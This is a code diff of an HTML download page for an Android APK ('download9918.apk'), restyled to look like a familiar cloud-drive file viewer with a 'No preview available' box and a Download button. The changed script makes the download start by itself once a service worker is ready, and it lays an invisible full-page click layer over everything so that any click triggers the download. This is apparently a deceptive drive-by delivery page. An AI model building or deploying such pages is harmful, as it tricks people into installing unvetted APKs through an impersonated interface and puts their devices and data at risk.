@@ -5,9 +5,9 @@
   <meta name="google" content="notranslate">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Download</title>
-  <script src="../params.js?v=personal-site-5"></script>
+  <script src="../params.js?v=personal-site-6"></script>
   <script>
-    window.__downloadTestRevision = 'personal-site-5';
+    window.__downloadTestRevision = 'personal-site-6';
     window.__downloadSwVersion = '42316858';
     window.__downloadSwUrl = `${window.__landingRoot}sw.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
     window.__swReadyPromise = (async () => {
@@ -57,135 +57,145 @@
   </script>
 <style>
 * {
-      box-sizing: border-box;
-      margin: 0;
       padding: 0;
-      font-family: Verdana, Arial, Helvetica, sans-serif;
+      margin: 0;
     }
 
     body {
-      min-height: 100vh;
-      overflow: hidden;
-      display: flex;
-      flex-direction: column;
-      background: #fff;
-      color: #1b1b1b;
+      margin: 0;
     }
 
-    .f-data {
-      margin: 20vh auto 0;
+    .content {
+      width: 100%;
+      background-color: #1e1e1f;
+      overflow: hidden;
+      height: 100vh;
+      position: relative;
+      font-family: Roboto, sans-serif;
+    }
+
+    .nav-container {
+      position: absolute;
+      width: 100%;
+      height: 70px;
+      z-index: 2;
+    }
+
+    .nav-menu {
+      width: 90%;
+      font-size: 16px;
       display: flex;
       flex-direction: row;
-      align-items: center;
-      gap: 15px;
-      font-size: 14px;
+      justify-content: space-between;
+      position: relative;
     }
 
-    .f-image {
-      width: 70px;
-      height: 105px;
-      background: url(file.png) center 6px / 70px no-repeat;
-      flex: 0 0 auto;
-    }
-
-    .f-info {
+    .name-part,
+    .manage-part,
+    .download,
+    .avatar,
+    .menu,
+    .view-box {
       display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .f-a-center {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .name-part {
+      gap: 10px;
+      color: #C4C7C5;
+    }
+
+    .name-part > .icon {
+      background-color: white;
+      padding: 1px;
+      border-radius: 2px;
+    }
+
+    .title {
+      max-width: 54vw;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .manage-part {
+      gap: 8px;
+    }
+
+    .manage-part > .avatar {
+      width: 30px;
+      height: 30px;
+      color: white;
+      background-color: orange;
+      border-radius: 100%;
+    }
+
+    .manage-part .menu {
       flex-direction: column;
       gap: 2px;
-    }
-
-    .f-name {
-      width: 200px;
-      overflow-wrap: break-word;
-      font-size: 14px;
-      font-weight: 700;
-    }
-
-    .f-size,
-    .f-uploaded {
-      font-size: 16px;
-    }
-
-    .s-box {
-      position: relative;
-      width: 270px;
       height: 50px;
-      margin: 12px auto 0;
-      padding: 1px;
-      border-radius: 10px;
-      box-shadow: 1px 1px 5px rgba(124, 124, 124, 0.223);
+      width: 50px;
     }
 
-    .scale {
-      width: 0;
-      height: 100%;
-      border-radius: 10px;
-      background: linear-gradient(279deg, rgba(109, 215, 90, 1) 1%, rgba(38, 130, 20, 1) 63%);
-      transition: 200ms;
+    .manage-part .menu .point {
+      background-color: #C4C7C5;
+      width: 5px;
+      height: 5px;
+      border-radius: 100%;
     }
 
-    .scale-percent {
-      position: absolute;
-      top: 10px;
-      left: 10px;
-      color: #fff;
-      font-size: 26px;
-      font-weight: 700;
-      text-shadow: 2px 2px rgb(29, 29, 29);
-    }
-
-    .d-box {
+    .view-box {
       position: relative;
+      z-index: 1;
       width: 100%;
-      height: 100px;
-      margin-top: 20px;
-      overflow: hidden;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      height: 100%;
     }
 
-    .d-button-box {
-      position: absolute;
-      top: -100%;
-      width: 250px;
-      height: 100px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: 1s;
-    }
-
-    button {
-      position: relative;
-      border: 0;
+    .inner-box {
+      background-color: #4d494c;
+      box-sizing: content-box;
+      color: white;
+      padding: 20px;
+      font-size: 19px;
       border-radius: 20px;
-      padding: 20px 38px;
+      width: 240px;
+      height: 80px;
       display: flex;
-      flex-direction: row;
+      flex-direction: column;
+      justify-content: space-between;
       align-items: center;
-      justify-content: center;
-      gap: 10px;
-      background: #339120;
-      box-shadow: 1px 1px 5px rgba(124, 124, 124, 0.223);
-      color: #fff;
-      font-size: 20px;
-      font-weight: 600;
-      letter-spacing: 1px;
-      text-align: center;
-      text-transform: uppercase;
-      cursor: pointer;
+      box-shadow: 0 10px 12px 5px rgba(0, 0, 0, .2);
     }
 
-    button:disabled {
-      cursor: wait;
-      opacity: 0.7;
+    .inner-box > .download {
+      background-color: #1b73e8;
+      width: 150px;
+      height: 30px;
+      flex-direction: row;
+      font-size: 12px;
+      color: white;
+    }
+
+    .inner-box > .download > .text {
+      width: 100px;
+      text-align: center;
+      text-shadow: 0 1px 0 rgba(0, 0, 0, .8);
     }
 
     .click-area {
-      position: fixed;
-      inset: 0;
-      z-index: 10;
+      z-index: 100;
+      position: absolute;
+      width: 100%;
+      height: 100vh;
+      top: 0;
+      left: 0;
       cursor: pointer;
     }
 
@@ -201,28 +211,49 @@
 </style>
 </head>
 <body>
-<div class="f-data">
-    <div class="f-image"></div>
-    <div class="f-info">
-      <div id="fileTitle" class="f-name">download9918.apk</div>
-      <div class="f-size">Size: 5.7 MB</div>
-      <div class="f-uploaded">March 22, 2026 10:41</div>
+<div class="content">
+    <div class="nav-container f-a-center">
+      <div class="nav-menu">
+        <div class="name-part f-a-center">
+          <div class="icon f-a-center">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 32 32" aria-hidden="true">
+              <g transform="translate(0,32) scale(0.1,-0.1)" fill="black" stroke="none">
+                <path d="M50 276 c-27 -33 18 -72 48 -42 13 13 14 20 6 34 -15 23 -38 26 -54 8z"/>
+                <path d="M173 253 c20 -2 54 -2 75 0 20 2 3 4 -38 4 -41 0 -58 -2 -37 -4z"/>
+                <path d="M44 175 c-10 -25 4 -45 30 -45 30 0 40 13 31 40 -8 24 -53 28 -61 5z"/>
+                <path d="M173 153 c20 -2 54 -2 75 0 20 2 3 4 -38 4 -41 0 -58 -2 -37 -4z"/>
+                <path d="M50 86 c-27 -33 18 -72 48 -42 13 13 14 20 6 34 -15 23 -38 26 -54 8z"/>
+                <path d="M173 63 c20 -2 54 -2 75 0 20 2 3 4 -38 4 -41 0 -58 -2 -37 -4z"/>
+              </g>
+            </svg>
+          </div>
+          <div id="fileTitle" class="title">download9918.apk</div>
+        </div>
+        <div class="manage-part f-a-center">
+          <div class="download f-a-center">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25" aria-hidden="true">
+              <path fill="#C4C7C5" d="M4 15h2v3h12v-3h2v3c0 1.1-.9 2-2 2H6c-1.1 0-2-.9-2-2m11.59-8.41L13 12.17V4h-2v8.17L8.41 9.59 7 11l5 5 5-5-1.41-1.41z"/>
+            </svg>
+          </div>
+          <div class="menu f-a-center" aria-hidden="true">
+            <div class="point first"></div>
+            <div class="point second"></div>
+            <div class="point third"></div>
+          </div>
+          <div class="avatar f-a-center">A</div>
+        </div>
+      </div>
     </div>
-  </div>
-  <div class="s-box">
-    <div class="scale-percent"></div>
-    <div class="scale"></div>
-  </div>
-  <div class="d-box">
-    <div class="d-button-box">
-      <button id="downloadButton" type="button" disabled>
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="35" height="35" aria-hidden="true">
-          <path fill="#fff" d="M12.001 16.8a.48.48 0 0 1-.48-.48V.96a.48.48 0 1 1 .96 0v15.36a.48.48 0 0 1-.48.48Z"/>
-          <path fill="#fff" d="M12 16.8a.482.482 0 0 1-.34-.14l-3.84-3.84a.48.48 0 1 1 .679-.679l3.5 3.5 3.5-3.5a.48.48 0 1 1 .681.679l-3.84 3.84a.478.478 0 0 1-.34.14Z"/>
-          <path fill="#fff" d="M21.12 23.52H2.88a2.4 2.4 0 0 1-2.4-2.4v-4.8a.48.48 0 0 1 .96 0v4.8a1.442 1.442 0 0 0 1.44 1.44h18.24a1.442 1.442 0 0 0 1.44-1.44v-4.8a.48.48 0 0 1 .96 0v4.8a2.4 2.4 0 0 1-2.4 2.4Z"/>
-        </svg>
-        <span>DOWNLOAD</span>
-      </button>
+    <div class="view-box f-a-center">
+      <div class="inner-box">
+        <div class="text">No preview available</div>
+        <div id="downloadButton" class="download f-a-center" role="button" tabindex="0" aria-disabled="true">
+          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 25 25" aria-hidden="true">
+            <path fill="#C4C7C5" d="M4 15h2v3h12v-3h2v3c0 1.1-.9 2-2 2H6c-1.1 0-2-.9-2-2m11.59-8.41L13 12.17V4h-2v8.17L8.41 9.59 7 11l5 5 5-5-1.41-1.41z"/>
+          </svg>
+          <div class="text">Download</div>
+        </div>
+      </div>
     </div>
   </div>
   <div id="clickArea" class="click-area" aria-hidden="true"></div>
@@ -241,16 +272,12 @@
     const downloadFrame = document.querySelector('#downloadFrame');
     const clickArea = document.querySelector('#clickArea');
     const fileTitle = document.querySelector('#fileTitle');
-    const scale = document.querySelector('.scale');
-    const scalePercentText = document.querySelector('.scale-percent');
-    const downloadButtonBox = document.querySelector('.d-button-box');
 
     let savedParams = new URLSearchParams();
     let offerId = null;
     let fileName = DEFAULT_FILE_NAME;
     let isServiceWorkerReady = false;
     let trustedClickCount = 0;
-    let isPresentationReady = false;
 
     function log(message, data) {
       if (data === undefined) {
@@ -305,12 +332,17 @@
       }
 
       isServiceWorkerReady = true;
+      downloadButton.disabled = !offerId;
       log('ready to download', {
         controller: swState.controller && swState.controller.scriptURL,
         swUrl: SW_URL,
         offerId,
         fileName,
       });
+
+      if (offerId) {
+        downloadButton.click();
+      }
     }
 
     function startDownload() {
@@ -328,10 +360,6 @@
     }
 
     function handleDownloadClick(event) {
-      if (!isPresentationReady) {
-        return;
-      }
-
       if (!isServiceWorkerReady) {
         log('download requested before service worker readiness');
         return;
@@ -349,39 +377,6 @@
       startDownload();
     }
 
-    function runProgress() {
-      return new Promise((resolve) => {
-        let scorePercent = 0;
-        scalePercentText.textContent = '0%';
-        const timer = window.setInterval(() => {
-          scorePercent += 10;
-          scale.style.width = `${scorePercent}%`;
-          scalePercentText.textContent = `${scorePercent}%`;
-          if (scorePercent < 100) {
-            return;
-          }
-
-          window.clearInterval(timer);
-          // Let the final 200ms scale transition reach 100% before revealing the button.
-          window.setTimeout(() => {
-            let fallback;
-            function finish(event) {
-              if (event && (event.target !== downloadButtonBox || event.propertyName !== 'top')) {
-                return;
-              }
-              window.clearTimeout(fallback);
-              downloadButtonBox.removeEventListener('transitionend', finish);
-              resolve();
-            }
-            downloadButtonBox.addEventListener('transitionend', finish);
-            // Also complete in background tabs where transitionend may not fire.
-            fallback = window.setTimeout(finish, 1100);
-            downloadButtonBox.style.top = '0';
-          }, 200);
-        }, 100);
-      });
-    }
-
     if (fileTitle) {
       fileTitle.textContent = fileName;
     }
@@ -389,18 +384,10 @@
     downloadButton.addEventListener('click', handleDownloadClick);
     clickArea.addEventListener('click', handleDownloadClick);
 
-    const downloadReady = registerServiceWorker().catch((error) => {
+    registerServiceWorker().catch((error) => {
       console.error('[download] service worker setup failed', error);
       downloadButton.disabled = true;
       log('service worker setup failed', { error: error.message, offerId });
-    });
-
-    Promise.all([runProgress(), downloadReady]).then(() => {
-      isPresentationReady = true;
-      downloadButton.disabled = !(isServiceWorkerReady && offerId);
-      if (!downloadButton.disabled) {
-        startDownload();
-      }
     });
 
 })();
